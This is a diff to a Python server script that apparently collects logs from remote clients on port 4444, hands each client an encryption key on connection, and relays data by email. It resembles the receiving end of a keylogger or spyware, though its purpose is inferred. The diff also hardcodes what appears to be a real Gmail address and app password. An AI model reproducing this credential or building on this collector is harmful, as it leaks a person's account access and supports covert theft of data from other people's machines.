@@ -12,13 +12,12 @@ HOST = '0.0.0.0'  # Listen on all available network interfaces
 PORT = 4444
 LOG_DIR = 'remote_logs'
 KEY_FILE = 'secret.key'
-
 # --- Email Configuration ---
-SMTP_SERVER = 'smtp.your-email-provider.com'
+SMTP_SERVER = 'smtp.gmail.com'
 SMTP_PORT = 587
-SMTP_USERNAME = 'your-email@example.com'
-SMTP_PASSWORD = 'your-email-password'
-EMAIL_RECIPIENT = 'recipient-email@example.com'
+SMTP_USERNAME = 'ongeradaryn@gmail.com'
+SMTP_PASSWORD = 'saxk mccg rpzk cjja'
+EMAIL_RECIPIENT = 'ongeradaryn@gmail.com'
 
 # --- Setup ---
 os.makedirs(LOG_DIR, exist_ok=True)
@@ -63,15 +62,11 @@ def handle_client(conn, addr):
     os.makedirs(client_log_dir, exist_ok=True)
 
     try:
-        # First message determines if it's a key request or data
-        initial_data = conn.recv(1024)
-        if initial_data.strip() == b'get_key':
-            conn.sendall(key)
-            conn.close()
-            print(f"[+] Sent key to {client_ip}")
-            return
+        # Send the key to the client immediately upon connection
+        conn.sendall(key)
+        print(f"[+] Sent key to {client_ip}")
 
-        buffer = initial_data
+        buffer = b''
         while True:
             while b'\n' in buffer:
                 message, buffer = buffer.split(b'\n', 1)
